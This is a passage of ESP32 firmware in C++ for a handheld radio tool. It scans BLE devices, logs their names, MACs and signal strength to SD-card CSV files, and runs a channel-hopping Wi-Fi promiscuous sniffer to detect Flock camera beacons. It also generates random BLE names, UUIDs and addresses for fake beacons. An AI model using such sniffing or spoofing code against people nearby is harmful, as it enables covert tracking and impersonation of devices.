void handleBLEScannerInput() {
    if (bluetoothSnifferProfile == BT_SNIFFER_ANALYZER) {
        if (isPressed(BTN_SELECT)) {
            navigateBack();
            toolScreenEnteredAt = 0;
            delay(150);
        }
        return;
    }

    if (isPressed(BTN_LEFT)) {
        bleScanCancelRequested = true;
        bleScanRunning = false;
        bleContinuousScanAt = 0;
        bleAnalyzerNextScanMs = 0;
        bleScanWarmupRetries = 0;
        setBLEScanStatus("Stopping scan");
        bleNeedsRedraw = true;
        navigateBack();
        delay(150);
        return;
    }

    // Allow input even while scanning - removed blocking

    int filteredIndexes[MAX_SCAN_RESULTS];
    int filteredCount = 0;
    for (int i = 0; i < bleDeviceCount && filteredCount < MAX_SCAN_RESULTS; i++) {
        if (!bleMatchesBluetoothSnifferProfile(i)) {
            continue;
        }
        filteredIndexes[filteredCount++] = i;
    }

    int totalItems = filteredCount + 1;
    if (bleSelectedIndex >= totalItems) {
        bleSelectedIndex = max(0, totalItems - 1);
    }

    if (isPressed(BTN_RIGHT) && bleSelectedIndex == filteredCount && filteredCount > 0) {
        orionToolsExportBleCsv();
        delay(150);
        return;
    }

    // RIGHT on a device row = toggle sort mode (Strongest ↔ Newest)
    if (isPressed(BTN_RIGHT) && bleSelectedIndex < filteredCount) {
        bleSortMode = (bleSortMode == 0) ? 1 : 0;
        sortBLEResults();
        showToast(bleSortMode == 1 ? "Sort: Newest first" : "Sort: Strongest first");
        bleNeedsRedraw = true;
        // BUG FIX 1.17: Removed unnecessary bleScannerFirstDraw = true (causes flickering)
        // bleScannerFirstDraw = true;
        delay(150);
        return;
    }

    if (isPressed(BTN_UP)) {
        bleSelectedIndex--;
        if (bleSelectedIndex < 0) bleSelectedIndex = totalItems - 1;
        bleNeedsRedraw = true;
    }

    if (isPressed(BTN_DOWN)) {
        bleSelectedIndex++;
        if (bleSelectedIndex >= totalItems) bleSelectedIndex = 0;
        bleNeedsRedraw = true;
    }

    if (isPressed(BTN_SELECT)) {

        if (bleSelectedIndex == filteredCount) {

            LOG("BLE RESCAN");

            bleScanRunning = true;
            bleScanStartedAt = millis();
            bleScanReadyAt = millis() + 420UL;
            bleScanAutoRetryPending = true;
            bleScanWarmupRetries = 2;
            blePreserveResultsOnNextScan = false;
            bleContinuousScanAt = 0;
            bleScanTaskHandle = NULL;
            setBLEScanStatus("Queueing scan");
            clearBLEScanResults();
            bleAnalyzerNextScanMs = 0;

            bleNeedsRedraw = true;
            bleScannerFirstDraw = true;

            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);

            return;
        }

        int actualIndex = filteredIndexes[bleSelectedIndex];
        bleDetailIndex = actualIndex;
        setBLEFocusedDevice(actualIndex);
        bleDetailActive = false;
        // Pause BLE scan so it doesn't overwrite the detail screen
        bleScanRunning = false;
        bleContinuousScanAt = 0;
        bleAnalyzerNextScanMs = 0;
        currentScreen = SCREEN_BLE_DETAIL;
        drawBLEDetail();  // Draw immediately (includes screen clear and status bar)

        delay(150);
    }
}

void handleBLELoggerPickerInput() {
    // Allow input even while scanning - removed blocking

    if (isPressed(BTN_LEFT)) {
        bleScanCancelRequested = true;
        bleScanRunning = false;
        bleContinuousScanAt = 0;
        bleAnalyzerNextScanMs = 0;
        bleScanWarmupRetries = 0;
        setBLEScanStatus("Stopping scan");
        bleNeedsRedraw = true;
        navigateBack();
        delay(150);
        return;
    }

    int totalItems = bleDeviceCount + 1;

    if (isPressed(BTN_UP)) {
        bleSelectedIndex--;
        if (bleSelectedIndex < 0) bleSelectedIndex = totalItems - 1;
        bleNeedsRedraw = true;
    }

    if (isPressed(BTN_DOWN)) {
        bleSelectedIndex++;
        if (bleSelectedIndex >= totalItems) bleSelectedIndex = 0;
        bleNeedsRedraw = true;
    }

    if (isPressed(BTN_SELECT)) {
        if (bleSelectedIndex == bleDeviceCount) {
            bleScanRunning = true;
            bleScanStartedAt = millis();
            bleScanReadyAt = millis() + 420UL;
            bleScanAutoRetryPending = true;
            bleScanWarmupRetries = 2;
            bleScanTaskHandle = NULL;
            setBLEScanStatus("Queueing scan");
            clearBLEScanResults();
            bleLoggerTargetIndex = -1;
            bleLoggerTargetName = "";
            bleLoggerTargetMAC = "";
            bleLoggerCurrentRSSI = -100;
            bleNeedsRedraw = true;
            bleScannerFirstDraw = true;
            tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
            return;
        }

        enterMode(BLE_SIGNAL_LOGGER);
        setBLELoggerTargetByIndex(bleSelectedIndex);
        bleLoggerFirstDraw = true;
        bleLoggerNeedsRedraw = true;
        bleLoggerLastSampleMs = 0;
        resetBLELoggerBuffer();
        if (bleSelectedIndex >= 0 && bleSelectedIndex < bleDeviceCount) {
            bleLoggerCurrentRSSI = bleRSSI[bleSelectedIndex];
            bleLoggerSamples[0] = bleLoggerCurrentRSSI;
            bleLoggerWriteIndex = 1;
            bleLoggerSampleCount = 1;
        }
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        delay(150);
    }
}

void runBLELoggerPicker() {
    unsigned long &lastAnim = lastScanAnim;
    uint8_t &dots = scanDots;
    bool &firstDraw = bleScannerFirstDraw;

    int beforePruneCount = bleDeviceCount;
    pruneBLEScanResults(12000UL);
    if (bleDeviceCount != beforePruneCount) {
        bleNeedsRedraw = true;
    }

    if (bleScanRunning && bleScanStartedAt != 0 && millis() - bleScanStartedAt > 20000UL) {
        LOG("BLE logger scan timeout reset");
        bleScanRunning = false;
        bleScanStartedAt = 0;
        bleScanReadyAt = 0;
        bleScanWarmupRetries = 0;
        bleScanTaskHandle = NULL;
        radioLocked = false;
        setBLEScanStatus("Logger timeout", true);
        bleNeedsRedraw = true;
    }

    // Show results immediately - no scanning screen

    if (!bleNeedsRedraw) return;
    bleNeedsRedraw = false;

    int highlightIndex = findBLEDeviceByMAC(bleLoggerTargetMAC);
    drawBLEListView("Signal Logger", highlightIndex, "Scan Again",
                    "Choose a device", "UP/DN move  SEL graph");
}

String sanitizeBLEText(const std::string& value) {
    String text = "";
    text.reserve(value.length());

    for (size_t i = 0; i < value.length(); i++) {
        char c = value[i];

        if (c >= 32 && c <= 126) {
            text += c;
        }
    }

    text.trim();
    return text;
}

String getBLECompanyName(uint16_t companyId) {
    switch (companyId) {
        case 0x000D: return "TI";
        case 0x0030: return "STMicro";
        case 0x0006: return "Microsoft";
        case 0x004C: return "Apple";
        case 0x0059: return "Nordic";
        case 0x0075: return "Samsung";
        case 0x0087: return "Garmin";
        case 0x00D2: return "Dialog";
        case 0x00AD: return "Fitbit";
        case 0x00E0: return "Google";
        case 0x00F8: return "Bose";
        case 0x012D: return "Sony";
        case 0x013D: return "Tile";
        case 0x09C8: return "Xuntong";
        default:     return "";
    }
}

uint16_t getBLECompanyId(const NimBLEAdvertisedDevice* device) {
    if (!device || !device->haveManufacturerData()) {
        return 0;
    }

    std::string mfgData = device->getManufacturerData();
    if (mfgData.length() < 2) {
        return 0;
    }

    return (uint8_t)mfgData[0] |
           ((uint16_t)(uint8_t)mfgData[1] << 8);
}

void enqueueFlockWiFiAlert(const char* name, const char* mac, int8_t rssi, uint8_t channel, const char* hint) {
    if (!name || !mac || !hint) {
        return;
    }
    if (flockWiFiAlerts == nullptr) {
        flockWiFiAlerts = (FlockWiFiAlert*)heap_caps_calloc(
            FLOCK_WIFI_ALERT_QUEUE_SIZE,
            sizeof(FlockWiFiAlert),
            MALLOC_CAP_8BIT
        );
        if (flockWiFiAlerts == nullptr) {
            return;
        }
    }

    portENTER_CRITICAL(&flockWiFiAlertMux);
    uint8_t nextHead = (uint8_t)((flockWiFiAlertHead + 1) % FLOCK_WIFI_ALERT_QUEUE_SIZE);
    if (nextHead == flockWiFiAlertTail) {
        flockWiFiAlertTail = (uint8_t)((flockWiFiAlertTail + 1) % FLOCK_WIFI_ALERT_QUEUE_SIZE);
    }

    FlockWiFiAlert& slot = flockWiFiAlerts[flockWiFiAlertHead];
    strncpy(slot.name, name, sizeof(slot.name) - 1);
    slot.name[sizeof(slot.name) - 1] = 0;
    strncpy(slot.mac, mac, sizeof(slot.mac) - 1);
    slot.mac[sizeof(slot.mac) - 1] = 0;
    slot.rssi = rssi;
    slot.channel = channel;
    strncpy(slot.hint, hint, sizeof(slot.hint) - 1);
    slot.hint[sizeof(slot.hint) - 1] = 0;
    flockWiFiAlertHead = nextHead;
    portEXIT_CRITICAL(&flockWiFiAlertMux);
}

void drainFlockWiFiAlerts() {
    if (flockWiFiAlerts == nullptr) {
        return;
    }

    while (true) {
        FlockWiFiAlert alert = {};

        portENTER_CRITICAL(&flockWiFiAlertMux);
        if (flockWiFiAlertTail == flockWiFiAlertHead) {
            portEXIT_CRITICAL(&flockWiFiAlertMux);
            break;
        }

        alert = flockWiFiAlerts[flockWiFiAlertTail];
        flockWiFiAlertTail = (uint8_t)((flockWiFiAlertTail + 1) % FLOCK_WIFI_ALERT_QUEUE_SIZE);
        portEXIT_CRITICAL(&flockWiFiAlertMux);

        storeBLEDeviceResult(String(alert.name), String(alert.mac), alert.rssi, bleDeviceCount,
                             0, BLE_FLAG_FLOCK, String(alert.hint), 0);
        bleNeedsRedraw = true;
    }
}

bool flockExtractMgmtSsid(const uint8_t* payload, uint16_t sigLen, uint8_t frameType,
                          char* ssidBuf, size_t ssidBufLen, bool* wildcardOut) {
    if (!payload || !ssidBuf || ssidBufLen == 0) {
        return false;
    }

    int ieOffset = -1;
    if (frameType == 0x40) {
        ieOffset = 24;
    } else if (frameType == 0x80 || frameType == 0x50) {
        ieOffset = 36;
    }

    if (ieOffset < 0 || (uint16_t)ieOffset >= sigLen) {
        return false;
    }

    ssidBuf[0] = 0;
    if (wildcardOut) {
        *wildcardOut = false;
    }

    while ((uint16_t)(ieOffset + 1) < sigLen) {
        uint8_t ieType = payload[ieOffset];
        uint8_t ieLen = payload[ieOffset + 1];
        if ((uint16_t)(ieOffset + 2 + ieLen) > sigLen) {
            break;
        }

        if (ieType == 0x00) {
            if (wildcardOut) {
                *wildcardOut = (ieLen == 0);
            }
            size_t copyLen = min((size_t)ieLen, ssidBufLen - 1);
            if (copyLen > 0) {
                memcpy(ssidBuf, &payload[ieOffset + 2], copyLen);
            }
            ssidBuf[copyLen] = 0;
            return true;
        }

        ieOffset += 2 + ieLen;
    }

    return false;
}

bool ensureFlockWiFiSniffer(bool resetHop) {
    if (resetHop) {
        flockWiFiHopIndex = 0;
        wifiSnifferHopChannel = kFlockHopChannels[0];
        wifiSnifferLastHop = 0;
        flockWiFiLastHopMs = 0;
    }

    if (flockWiFiHybridArmed) {
        return true;
    }

    resetWiFi();
    if (!WiFi.mode(WIFI_STA)) {
        wifiInitRetryAt = millis() + 1500UL;
        return false;
    }

    WiFi.disconnect(false, false);
    
    // Set MAXIMUM WiFi power for maximum range and better reception
    esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    
    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_extended);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        esp_wifi_set_promiscuous_rx_cb(NULL);
        wifiInitRetryAt = millis() + 1500UL;
        return false;
    }

    esp_wifi_set_channel(kFlockHopChannels[flockWiFiHopIndex], WIFI_SECOND_CHAN_NONE);
    wifiSnifferHopChannel = kFlockHopChannels[flockWiFiHopIndex];
    wifiSnifferLastHop = millis();
    flockWiFiLastHopMs = wifiSnifferLastHop;
    flockWiFiHybridArmed = true;
    return true;
}

void serviceFlockWiFiSniffer(bool resetHop) {
    if (currentRadioMode != BLE_SCAN || bluetoothSnifferProfile != BT_SNIFFER_FLOCK) {
        return;
    }

    if (!ensureFlockWiFiSniffer(resetHop)) {
        return;
    }

    unsigned long now = millis();
    if (flockWiFiLastHopMs == 0 || now - flockWiFiLastHopMs >= 220UL) {  // 220ms dwell — catches 100ms Flock beacon interval reliably
        flockWiFiHopIndex = (uint8_t)((flockWiFiHopIndex + 1) % (sizeof(kFlockHopChannels) / sizeof(kFlockHopChannels[0])));
        wifiSnifferHopChannel = kFlockHopChannels[flockWiFiHopIndex];
        esp_wifi_set_channel(wifiSnifferHopChannel, WIFI_SECOND_CHAN_NONE);
        wifiSnifferLastHop = now;
        flockWiFiLastHopMs = now;
    }
}

void stopFlockWiFiSniffer() {
    if (!flockWiFiHybridArmed) {
        return;
    }

    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    flockWiFiHybridArmed = false;
    flockWiFiHopIndex = 0;
    flockWiFiLastHopMs = 0;
    portENTER_CRITICAL(&flockWiFiAlertMux);
    flockWiFiAlertHead = 0;
    flockWiFiAlertTail = 0;
    portEXIT_CRITICAL(&flockWiFiAlertMux);
    if (flockWiFiAlerts != nullptr) {
        free(flockWiFiAlerts);
        flockWiFiAlerts = nullptr;
    }
}

String getBLEServiceName(const NimBLEAdvertisedDevice* device) {
    if (!device || !device->haveServiceUUID()) {
        return "";
    }

    String uuid = device->getServiceUUID().toString().c_str();
    uuid.toUpperCase();

    if (uuid == "180A") return "Device Info";
    if (uuid == "180D") return "Heart Rate";
    if (uuid == "180F") return "Battery";
    if (uuid == "1812") return "HID Device";
    if (uuid == "181A") return "Env Sensor";
    if (uuid == "1821") return "Indoor Pos";
    if (uuid == "1826") return "Fitness Machine";
    if (uuid == "FEAA") return "Eddystone";
    if (uuid == "FE2C" || uuid == "FEF3") return "Beacon/IoT";

    return "";
}

String getBLEDisplayName(const NimBLEAdvertisedDevice* device) {
    if (!device) {
        return "Unknown BLE";
    }

    String name = sanitizeBLEText(device->getName());
    if (name.length() > 0) {
        return name;
    }

    if (device->haveManufacturerData()) {
        uint16_t companyId = getBLECompanyId(device);
        if (companyId != 0) {
            String company = getBLECompanyName(companyId);
            if (company.length() > 0) {
                return company + " BLE";
            }
        }
    }

    String service = getBLEServiceName(device);
    if (service.length() > 0) {
        return service;
    }

    // Fall back to MAC so nameless devices (IoT, beacons, etc.) still appear
    std::string addrStr = device->getAddress().toString();
    return String(addrStr.c_str());
}

bool isGenericBLEName(const char* name) {
    return strcmp(name, "Unknown BLE") == 0 ||
           (strlen(name) > 4 && strcmp(name + strlen(name) - 4, " BLE") == 0) ||
           strcmp(name, "Device Info") == 0 ||
           strcmp(name, "Heart Rate") == 0 ||
           strcmp(name, "Battery") == 0 ||
           strcmp(name, "HID Device") == 0 ||
           strcmp(name, "Env Sensor") == 0 ||
           strcmp(name, "Indoor Pos") == 0 ||
           strcmp(name, "Fitness Machine") == 0 ||
           strcmp(name, "Beacon/IoT") == 0 ||
           strcmp(name, "Eddystone") == 0;
}

bool bleNameLooksMac(const char* name) {
    if (!name || strlen(name) != 17) {
        return false;
    }

    for (int i = 0; i < 17; i++) {
        char c = name[i];
        if ((i % 3) == 2) {
            if (c != ':') {
                return false;
            }
            continue;
        }

        bool isHex = (c >= '0' && c <= '9') ||
                     (c >= 'A' && c <= 'F') ||
                     (c >= 'a' && c <= 'f');
        if (!isHex) {
            return false;
        }
    }

    return true;
}

bool shouldReplaceBLEName(const char* existingName, const String& candidateName) {
    if (candidateName.length() == 0) {
        return false;
    }

    if (!existingName || existingName[0] == 0) {
        return true;
    }

    if (strcmp(existingName, candidateName.c_str()) == 0) {
        return false;
    }

    bool existingGeneric = isGenericBLEName(existingName) || bleNameLooksMac(existingName);
    bool candidateGeneric = isGenericBLEName(candidateName.c_str()) || bleNameLooksMac(candidateName.c_str());

    if (existingGeneric && !candidateGeneric) {
        return true;
    }

    if (bleNameLooksMac(existingName) && !bleNameLooksMac(candidateName.c_str())) {
        return true;
    }

    if (!candidateGeneric && candidateName.length() > strlen(existingName) + 3) {
        return true;
    }

    return false;
}

void storeBLEDeviceResult(const String& name, const String& mac, int rssi, int &count,
                          uint16_t companyId = 0, uint16_t detectFlags = BLE_FLAG_NONE,
                          const String& hint = "", uint16_t primaryId = 0) {
    if (count < 0) {
        count = 0;
    }
    if (count > MAX_SCAN_RESULTS) {
        count = MAX_SCAN_RESULTS;
    }

    for (int i = 0; i < count; i++) {
        if (strcmp(bleMACs[i], mac.c_str()) != 0) continue;

        int previousRssi = bleRSSI[i];
        bleRSSI[i] = (previousRssi == -100) ? rssi : ((previousRssi * 3) + rssi) / 4;
        if (rssi > bleRSSI[i]) bleRSSI[i] = rssi;

        if (shouldReplaceBLEName(bleNames[i], name)) {
            strncpy(bleNames[i], name.c_str(), 31); bleNames[i][31] = 0;
        }
        if (bleCompanyIds[i] == 0 && companyId != 0) {
            bleCompanyIds[i] = companyId;
        }
        bleDetectFlags[i] |= detectFlags;
        if (blePrimaryIds[i] == 0 && primaryId != 0) {
            blePrimaryIds[i] = primaryId;
        }
        if (hint.length() > 0 &&
            (bleHints[i][0] == '\0' ||
             bleHintPriority(hint) > bleHintPriority(String(bleHints[i])))) {
            strncpy(bleHints[i], hint.c_str(), sizeof(bleHints[i]) - 1);
            bleHints[i][sizeof(bleHints[i]) - 1] = 0;
        }

        bleLastSeen[i] = millis();
        return;
    }

    if (count >= MAX_SCAN_RESULTS) return;

    if (rssi < orionToolsBleMinRssi()) {
        return;
    }

    strncpy(bleNames[count], name.c_str(), 31); bleNames[count][31] = 0;
    strncpy(bleMACs[count],  mac.c_str(),  17); bleMACs[count][17]  = 0;
    bleRSSI[count]  = rssi;
    bleCompanyIds[count] = companyId;
    bleDetectFlags[count] = detectFlags;
    blePrimaryIds[count] = primaryId;
    if (hint.length() > 0) {
        strncpy(bleHints[count], hint.c_str(), sizeof(bleHints[count]) - 1);
        bleHints[count][sizeof(bleHints[count]) - 1] = 0;
    } else {
        bleHints[count][0] = 0;
    }
    bleLastSeen[count] = millis();
    count++;
}

void sortBLEResultsByRSSI() {
    for (int i = 0; i < bleDeviceCount - 1; i++) {
        for (int j = i + 1; j < bleDeviceCount; j++) {
            if (bleRSSI[j] <= bleRSSI[i]) continue;
            char tmp[32];
            strncpy(tmp, bleNames[i], 32); strncpy(bleNames[i], bleNames[j], 32); strncpy(bleNames[j], tmp, 32);
            strncpy(tmp, bleMACs[i],  18); strncpy(bleMACs[i],  bleMACs[j],  18); strncpy(bleMACs[j],  tmp, 18);
            std::swap(bleRSSI[i], bleRSSI[j]);
            std::swap(bleCompanyIds[i], bleCompanyIds[j]);
            std::swap(bleDetectFlags[i], bleDetectFlags[j]);
            std::swap(blePrimaryIds[i], blePrimaryIds[j]);
            std::swap(bleLastSeen[i], bleLastSeen[j]);
            char hintTmp[24];
            strncpy(hintTmp, bleHints[i], sizeof(hintTmp));
            strncpy(bleHints[i], bleHints[j], sizeof(bleHints[i]));
            strncpy(bleHints[j], hintTmp, sizeof(bleHints[j]));
        }
        yield();
    }
}

void sortBLEResultsByNewest() {
    // Sort descending by lastSeen (most recently seen first)
    for (int i = 0; i < bleDeviceCount - 1; i++) {
        for (int j = i + 1; j < bleDeviceCount; j++) {
            if (bleLastSeen[j] <= bleLastSeen[i]) continue;
            char tmp[32];
            strncpy(tmp, bleNames[i], 32); strncpy(bleNames[i], bleNames[j], 32); strncpy(bleNames[j], tmp, 32);
            strncpy(tmp, bleMACs[i],  18); strncpy(bleMACs[i],  bleMACs[j],  18); strncpy(bleMACs[j],  tmp, 18);
            std::swap(bleRSSI[i], bleRSSI[j]);
            std::swap(bleCompanyIds[i], bleCompanyIds[j]);
            std::swap(bleDetectFlags[i], bleDetectFlags[j]);
            std::swap(blePrimaryIds[i], blePrimaryIds[j]);
            std::swap(bleLastSeen[i], bleLastSeen[j]);
            char hintTmp[24];
            strncpy(hintTmp, bleHints[i], sizeof(hintTmp));
            strncpy(bleHints[i], bleHints[j], sizeof(bleHints[i]));
            strncpy(bleHints[j], hintTmp, sizeof(bleHints[j]));
        }
        yield();
    }
}

// Apply current sort mode
void sortBLEResults() {
    if (bleSortMode == 1) sortBLEResultsByNewest();
    else                  sortBLEResultsByRSSI();
}

void writeSavedMacCsvField(File& file, const char* value) {
    file.print('"');
    if (value != nullptr) {
        for (const char* p = value; *p; p++) {
            if (*p == '"') {
                file.print("\"\"");
            } else if (*p == '\r' || *p == '\n') {
                file.print(' ');
            } else {
                file.print(*p);
            }
        }
    }
    file.print('"');
}

// Open a new BLE session CSV file (called when BLE scanner app starts)
void bleSessionOpen() {
    if (!validateSDReady(true)) return;
    beginSPIOperation(true);
    SD.mkdir("/captures");
    SD.mkdir("/captures/ble");
    endSPIOperation(false);

    bleSessionPath = "/captures/ble/ble_scan_" + String(millis()) + ".csv";

    beginSPIOperation(true);
    File f = SD.open(bleSessionPath.c_str(), FILE_WRITE);
    if (f) {
        f.println("name,mac,rssi,company,type_hint,last_seen_ms");
        f.close();
        bleSessionActive = true;
        LOG("BLE session opened: " + bleSessionPath);
    } else {
        bleSessionActive = false;
        bleSessionPath = "";
        LOG("BLE session open failed");
    }
    endSPIOperation(false);
}

// Close the session (called when leaving BLE scanner)
void bleSessionClose() {
    if (bleSessionActive) {
        LOG("BLE session closed: " + bleSessionPath);
    }
    bleSessionActive = false;
    bleSessionPath = "";
}

// Rewrite the session file with the current BLE scan results
void saveBLESavedMacSnapshot() {
    if (bleDeviceCount <= 0 || !bleSessionActive || !validateSDReady(false)) return;

    beginSPIOperation(true);
    SD.remove(bleSessionPath.c_str());
    File f = SD.open(bleSessionPath.c_str(), FILE_WRITE);
    if (!f) {
        endSPIOperation(false);
        return;
    }

    f.println("name,mac,rssi,company,type_hint,last_seen_ms");
    for (int i = 0; i < bleDeviceCount; i++) {
        String typeHint = bleHints[i];
        if (typeHint.length() == 0 && bleCompanyIds[i] != 0) {
            typeHint = getBLECompanyName(bleCompanyIds[i]);
        }
        writeSavedMacCsvField(f, bleNames[i]);
        f.print(',');
        writeSavedMacCsvField(f, bleMACs[i]);
        f.print(',');
        f.print(bleRSSI[i]);
        f.print(',');
        f.print(bleCompanyIds[i]);
        f.print(',');
        writeSavedMacCsvField(f, typeHint.c_str());
        f.print(',');
        f.println(bleLastSeen[i]);

        if ((i & 0x07) == 0x07) yield();
    }

    f.close();
    endSPIOperation(false);
}

void pruneBLEScanResults(unsigned long maxAgeMs) {
    const unsigned long now = millis();
    int writeIndex = 0;

    for (int readIndex = 0; readIndex < bleDeviceCount; readIndex++) {
        if (bleLastSeen[readIndex] == 0 || now - bleLastSeen[readIndex] > maxAgeMs) {
            continue;
        }

        if (writeIndex != readIndex) {
            strncpy(bleNames[writeIndex], bleNames[readIndex], sizeof(bleNames[writeIndex]));
            strncpy(bleMACs[writeIndex], bleMACs[readIndex], sizeof(bleMACs[writeIndex]));
            bleRSSI[writeIndex] = bleRSSI[readIndex];
            bleCompanyIds[writeIndex] = bleCompanyIds[readIndex];
            bleDetectFlags[writeIndex] = bleDetectFlags[readIndex];
            blePrimaryIds[writeIndex] = blePrimaryIds[readIndex];
            strncpy(bleHints[writeIndex], bleHints[readIndex], sizeof(bleHints[writeIndex]));
            bleLastSeen[writeIndex] = bleLastSeen[readIndex];
        }

        writeIndex++;
    }

    for (int i = writeIndex; i < MAX_SCAN_RESULTS; i++) {
        bleNames[i][0] = 0;
        bleMACs[i][0] = 0;
        bleRSSI[i] = -100;
        bleCompanyIds[i] = 0;
        bleDetectFlags[i] = BLE_FLAG_NONE;
        blePrimaryIds[i] = 0;
        bleHints[i][0] = 0;
        bleLastSeen[i] = 0;
    }

    bleDeviceCount = writeIndex;
}

void setBLEFocusedDevice(int index) {
    if (index < 0 || index >= bleDeviceCount) return;

    strncpy(bleFocusedName, bleNames[index], 31);
    bleFocusedName[31] = '\0';
    strncpy(bleFocusedMAC, bleMACs[index], 17);
    bleFocusedMAC[17] = '\0';
    bleFocusedRSSI = bleRSSI[index];
}

void resetBLELoggerBuffer() {
    for (int i = 0; i < BLE_LOGGER_POINTS; i++) {
        bleLoggerSamples[i] = -100;
    }

    bleLoggerWriteIndex = 0;
    bleLoggerSampleCount = 0;
    bleLoggerCurrentRSSI = -100;
    bleLoggerNeedsRedraw = true;
}

void resetBLERadarState() {
    bleRadarVisibleCount = 0;
    bleRadarLastScanMs = 0;
    bleRadarNeedsRedraw = true;
    bleRadarFirstDraw = true;

    for (int i = 0; i < BLE_RADAR_MAX_DEVICES; i++) {
        bleRadarKnownMACs[i] = "";
        bleRadarSmoothedRSSI[i] = -100.0f;
    }
}

int findBLERadarSlot(const String& mac) {
    int emptySlot = -1;

    for (int i = 0; i < BLE_RADAR_MAX_DEVICES; i++) {
        if (bleRadarKnownMACs[i] == mac) {
            return i;
        }
        if (emptySlot < 0 && bleRadarKnownMACs[i].length() == 0) {
            emptySlot = i;
        }
    }

    return emptySlot >= 0 ? emptySlot : 0;
}

float getSmoothedRadarRSSI(const String& mac, int currentRSSI) {
    int slot = findBLERadarSlot(mac);
    if (slot < 0 || slot >= BLE_RADAR_MAX_DEVICES) {
        return currentRSSI;
    }

    if (bleRadarKnownMACs[slot].length() == 0) {
        bleRadarKnownMACs[slot] = mac;
        bleRadarSmoothedRSSI[slot] = currentRSSI;
        return bleRadarSmoothedRSSI[slot];
    }

    float blend = (strlen(bleFocusedMAC) > 0 && strcmp(bleFocusedMAC, mac.c_str()) == 0) ? 0.08f : 0.15f;
    bleRadarSmoothedRSSI[slot] =
        (bleRadarSmoothedRSSI[slot] * (1.0f - blend)) + (currentRSSI * blend);
    return bleRadarSmoothedRSSI[slot];
}

float clampBLEFloat(float value, float minValue, float maxValue) {
    if (value < minValue) return minValue;
    if (value > maxValue) return maxValue;
    return value;
}

uint32_t hashBLEMAC(const String& mac) {
    uint32_t hash = 5381;

    for (int i = 0; i < mac.length(); i++) {
        hash = ((hash << 5) + hash) + (uint8_t)mac[i];
    }

    return hash;
}

void drawListScrollArrows(int totalItems, int visibleItems, int scrollOffset) {
    if (totalItems <= visibleItems) return;

    const int panelX = 223;
    const int panelW = 9;
    const int railX = 227;
    const int railY = 94;
    const int railH = 124;
    const int thumbW = 3;

    uint16_t panelColor = tft.color565(50, 50, 50);
    uint16_t railColor = tft.color565(80, 80, 80);
    uint16_t activeColor = ILI9341_WHITE;
    uint16_t inactiveColor = tft.color565(130, 130, 130);

    tft.fillRoundRect(panelX, 74, panelW, 162, 4, ILI9341_BLACK);

    tft.fillTriangle(227, 82, 224, 87, 230, 87, scrollOffset > 0 ? activeColor : inactiveColor);
    tft.fillTriangle(227, 230, 224, 225, 230, 225,
                     (scrollOffset + visibleItems < totalItems) ? activeColor : inactiveColor);

    tft.drawFastVLine(railX, railY, railH, railColor);

    int maxOffset = max(1, totalItems - visibleItems);
    int thumbH = max(12, (railH * visibleItems) / totalItems);
    int travel = railH - thumbH;
    int thumbY = railY + ((travel * scrollOffset) / maxOffset);

    tft.fillRoundRect(railX - 1, thumbY, thumbW, thumbH, 2, activeColor);
}

String generateRandomBLEUUID() {
    uint8_t uuidBytes[16];
    char uuidBuffer[37];

    for (int i = 0; i < 16; i++) {
        uuidBytes[i] = random(256);
    }

    uuidBytes[6] = (uuidBytes[6] & 0x0F) | 0x40;
    uuidBytes[8] = (uuidBytes[8] & 0x3F) | 0x80;

    snprintf(
        uuidBuffer,
        sizeof(uuidBuffer),
        "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
        uuidBytes[0], uuidBytes[1], uuidBytes[2], uuidBytes[3],
        uuidBytes[4], uuidBytes[5], uuidBytes[6], uuidBytes[7],
        uuidBytes[8], uuidBytes[9], uuidBytes[10], uuidBytes[11],
        uuidBytes[12], uuidBytes[13], uuidBytes[14], uuidBytes[15]
    );

    return String(uuidBuffer);
}

String generateRandomBLEName() {
    const char* start = bleBeaconNameStarts[random(bleBeaconNameStartCount)];
    const char* end = bleBeaconNameEnds[random(bleBeaconNameEndCount)];
    char nameBuffer[24];

    snprintf(nameBuffer, sizeof(nameBuffer), "%s %s %03X", start, end, random(0x1000));
    return String(nameBuffer);
}

String formatBLEHex16(uint16_t value) {
    char buffer[7];
    snprintf(buffer, sizeof(buffer), "0x%04X", value);
    return String(buffer);
}

void generateRandomStaticBLEAddress(uint8_t* address) {
    for (int i = 0; i < 6; i++) {
        address[i] = random(256);
    }

    // NimBLEAddress reverses the byte order for the stack, so set the
    // static-random bits on the human-readable first byte here.
    address[0] = (address[0] & 0x3F) | 0xC0;
}

String formatBLEPayloadHex(const std::vector<uint8_t>& payload) {
    String text = "";

    for (size_t i = 0; i < payload.size(); i++) {
        if (i > 0) text += " ";
        if (payload[i] < 0x10) text += "0";
        text += String(payload[i], HEX);
    }

    text.toUpperCase();
    return text;
}

void logBLEAdvertisementPayload(const char* label, const NimBLEAdvertisementData& data) {
    std::vector<uint8_t> payload = data.getPayload();
    LOG(String("BLE ") + label + " bytes=" + String(payload.size()));
    LOG(String("BLE ") + label + " payload=" + formatBLEPayloadHex(payload));
}

void drawBLEBeaconCard(int x, int y, int w, int h, const char* label, uint16_t accentColor) {
    uint16_t cardFill = tft.color565(28, 28, 28);
    uint16_t cardBorder = tft.color565(74, 74, 74);

    tft.fillRoundRect(x, y, w, h, 10, cardFill);
    tft.drawRoundRect(x, y, w, h, 10, cardBorder);

    tft.setTextSize(1);
    tft.setTextColor(accentColor);
    tft.setCursor(x + 10, y + 8);
    tft.print(label);
}

class BLEBeaconServerCallbacks : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer* pServer, NimBLEConnInfo& connInfo) override {
        LOG(String("BLE client connected: ") + connInfo.getAddress().toString().c_str());

        if (currentRadioMode == BLE_DEVICE_STABLE) {
            bleDeviceStatus = "Connected";
            bleDeviceNeedsRedraw = true;
        }
    }

    void onDisconnect(NimBLEServer* pServer, NimBLEConnInfo& connInfo, int reason) override {
        LOG(String("BLE client disconnected: ") + connInfo.getAddress().toString().c_str() +
